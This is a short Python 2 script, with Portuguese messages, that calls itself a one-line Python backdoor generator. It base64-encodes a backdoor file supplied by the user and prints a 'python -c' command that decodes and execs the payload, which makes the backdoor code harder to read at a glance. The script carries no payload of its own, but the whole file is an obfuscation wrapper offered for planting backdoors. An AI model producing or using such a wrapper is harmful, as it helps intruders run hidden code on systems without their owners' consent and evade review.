import argparse
import base64

def criar(path):
	payload = open(path, 'r')
	encoded = base64.b64encode(payload.read())
	print '[+] Execute a instrucao abaixo:\n'
	print '''python -c "import base64;exec(base64.b64decode('%s'))"''' % encoded
	print '\n'

parser = argparse.ArgumentParser(description = 'Python Backdoor (1 Linha)')
parser.add_argument('-p', '--path', help='Path do Backdoor', required=True)

args = parser.parse_args()
path = args.path

criar(path)
